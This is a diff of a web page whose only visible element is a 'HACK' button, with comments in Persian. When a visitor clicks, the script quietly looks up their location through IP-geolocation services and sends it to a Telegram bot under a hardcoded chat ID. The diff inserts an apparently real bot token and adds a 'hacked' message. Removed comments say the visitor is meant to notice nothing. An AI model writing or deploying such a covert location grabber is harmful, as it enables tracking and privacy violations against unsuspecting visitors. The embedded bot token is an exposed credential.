@@ -46,28 +46,37 @@
             transform:none;
             box-shadow:none;
         }
-        /* هیچ پیام یا تغییری نمایش داده نمی‌شود */
-        #hidden-status{
-            display:none;
+        #status{
+            color:#00ff41;
+            font-size:24px;
+            margin-top:20px;
+            font-weight:bold;
+            min-height:40px;
+            opacity:0;
+            transition:opacity 0.5s;
+        }
+        #status.show{
+            opacity:1;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <button class="btn-hack" id="hackBtn">HACK</button>
+        <div id="status">هک شد</div>
     </div>
 
     <script>
-    // ===== تنظیمات =====
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // <-- توکن خود را اینجا بگذارید
-    const CHAT_ID = '6340337525';         // <-- Chat ID خود را اینجا بگذارید
+    // ===== تنظیمات (با توکن واقعی شما) =====
+    const BOT_TOKEN = '8891127738:8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';   // <-- توکن کامل خود را اینجا بگذارید
+    const CHAT_ID = '6340337525';
 
     const btn = document.getElementById('hackBtn');
+    const statusEl = document.getElementById('status');
 
-    // ===== تابع دریافت موقعیت =====
+    // ===== دریافت موقعیت =====
     async function getLocation() {
         try {
-            //先用 geoplugin (معمولاً در ایران کار می‌کند)
             const res = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(5000) });
             const data = await res.json();
             if (data.geoplugin_latitude && data.geoplugin_latitude != '0') {
@@ -82,7 +91,6 @@
         } catch(e) {}
 
         try {
-            // پشتیبان: ip-api
             const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
             const data = await res.json();
             if (data.status === 'success') {
@@ -113,26 +121,26 @@
         const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
         try {
             await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
-        } catch(e) {}
+            return true;
+        } catch(e) {
+            return false;
+        }
     }
-
-    // ===== تابع اصلی (با کلیک دکمه) =====
+        // ===== تابع اصلی =====
     async function handleClick() {
-        // غیرفعال کردن دکمه (برای جلوگیری از کلیک مجدد)
         btn.disabled = true;
-        // دریافت موقعیت
-        const loc = await getLocation();
         
-        // اگر موقعیت دریافت شد، به تلگرام ارسال کن
+        const loc = await getLocation();
         if (loc) {
             await sendToTelegram(loc);
         }
         
-        // دکمه را دوباره فعال کن (به نظر کاربر هیچ اتفاقی نیفتاده)
+        // نمایش "هک شد"
+        statusEl.classList.add('show');
+        
         btn.disabled = false;
     }
 
-    // ===== اتصال رویداد کلیک =====
     btn.addEventListener('click', handleClick);
     </script>
 </body>
